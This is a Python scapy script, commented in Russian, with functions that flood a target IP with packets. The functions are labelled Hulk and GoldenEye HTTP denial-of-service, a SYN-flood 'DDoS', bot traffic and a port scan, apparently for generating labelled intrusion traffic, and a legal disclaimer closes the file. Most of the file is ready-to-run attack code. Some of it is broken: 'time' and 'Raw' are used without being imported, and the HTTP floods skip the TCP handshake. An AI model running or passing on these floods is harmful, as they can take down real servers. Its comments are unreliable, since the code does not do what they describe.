from scapy.all import IP, TCP, send
import random
import string

#обычный сценарий BENIGN
target_ip = "192.168.0.1"  # Целевой IP адрес
target_port = 80  # Целевой порт

# Создание и отправка большого количества пакетов
packet = IP(dst=target_ip)/TCP(dport=target_port)
send(packet, count=1000, inter=0.01)  # Меняйте параметр count для управления количеством пакетов

### 1. DoS Hulk
# Атака Hulk (HTTP Unbearable Load King) 
# является видом DoS-атаки, основанной на создании большого количества HTTP-запросов с уникальными URL, 
# чтобы избежать кэширования и максимально нагрузить сервер.

def hulk_attack(target_ip, target_port, duration):
    timeout = time.time() + duration
    payload = string.ascii_letters + string.digits + string.punctuation

    while time.time() < timeout:
        try:
            url_path = '/' + ''.join(random.choice(payload) for _ in range(random.randint(1, 10)))
            headers = "GET " + url_path + " HTTP/1.1\r\nHost: " + target_ip + "\r\n"
            headers += "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0\r\n"
            headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            headers += "Connection: keep-alive\r\n\r\n"

            packet = IP(dst=target_ip)/TCP(dport=target_port, flags="A")/Raw(load=headers)
            send(packet, verbose=False)
        except Exception as e:
            print(f"Attack failed: {e}")
            

# 2. DoS GoldenEye
# GoldenEye также является HTTP DoS-атакой, 
# которая активно использует как GET, 
# так и POST запросы для создания нагрузки.

def goldeneye_attack(target_ip, target_port, duration):
    timeout = time.time() + duration
    payload = string.ascii_letters + string.digits + string.punctuation

    while time.time() < timeout:
        try:
            load = ''.join(random.choice(payload) for _ in range(random.randint(10, 50)))
            packet = IP(dst=target_ip)/TCP(dport=target_port, flags="PA")/Raw(load=load)
            send(packet, verbose=False)
        except Exception as e:
            print(f"Attack failed: {e}")


### 3. DDoS
# Простой DDoS-сценарий, может использовать флуд SYN пакетами.

from scapy.all import *

def ddos_attack(target_ip, target_port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        send(IP(dst=target_ip)/TCP(dport=target_port, flags="S"), count=1000)


### 4. Bot
# Имитация бота может включать повторяющиеся 
# или основанные на шаблонах запросы/действия, 
# обычно автоматизированные.

def bot_activity(target_ip, target_port):
    for i in range(100):
        payload = "Hello server, I am a bot."
        packet = IP(dst=target_ip)/TCP(dport=target_port)/Raw(load=payload)
        send(packet)


### 5. Portscan
# Сканирование портов для выявления 
# открытых портов на объекте.

def port_scan(target_ip, range_start, range_end):
    open_ports = []
    for port in range(range_start, range_end+1):
        packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
        response = sr1(packet, timeout=1, verbose=0)
        if response and response.haslayer(TCP) and response[TCP].flags & 2:
            open_ports.append(port)
    return open_ports


### Предостережение
# Использование этих сценариев без явного разрешения может быть незаконным и привести
# к юридическим последствиям. Используйте эти сценарии только в законных и этических целях, 
# например, для тестирования своей собственной сети или в рамках утвержденных тестов на проникновение.